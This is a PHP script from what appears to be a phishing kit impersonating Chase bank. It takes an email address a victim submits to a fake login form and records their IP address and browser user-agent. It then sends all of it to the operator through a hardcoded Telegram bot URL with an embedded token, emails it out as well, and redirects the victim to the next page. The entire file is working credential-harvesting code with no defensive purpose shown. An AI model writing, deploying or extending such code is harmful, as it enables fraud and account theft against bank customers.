<?php

// Get user's IP address
$ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

// Start session
session_start();


// Check if the form is submitted
if (isset($_POST['eml'])) {
    // Include necessary files
    include 'to.php';

    // Get and store the email in session
    $email = $_POST['eml'];
    $_SESSION['email1'] = $email;

    // Compose message
    $message =  "<b>🔒 Email Access Chase</b>\n";
    $message .= "<b>User:</b> <code>{$_SESSION['email']}</code>\n";
    $message .= "<b>Email:</b> <code>$email</code>\n";
    $message .= "<b>🌐 IP Address:</b>$ip\n";
    $message .= "<b>🖥 User-Agent:</b>{$_SERVER['HTTP_USER_AGENT']}\n";
    $message .= "<b>🔍 Chase Result:</b>\n";

    // Set email subject and headers
    $subject = "Chase LOGIN";
    $headers = "From: BESHO@CHASE" . rand(1, 99) . "BESHO.V1 \r\n";

    // Extract domain from email
    $domainTLD = explode("@", $email)[1];
    $domain = explode(".", $domainTLD)[0];
    $_SESSION['domain'] = $domainTLD;

    // Set Telegram chat ID
    // $chatid = 'your_telegram_chat_id';

    // Send message to Telegram with HTML format
    file_get_contents("https://api.telegram.org/bot6024595519:AAHQcscrgYlrL2vxuh_mXG4FHKugXRA4Rww/sendMessage?chat_id=" . $chatid . "&parse_mode=HTML&text=" . urlencode($message));

    // Send email
    $done = mail($toemail, $subject, $message, $headers);

    // Redirect to the specified page
    header('Location: ./red4.php');
}

?>
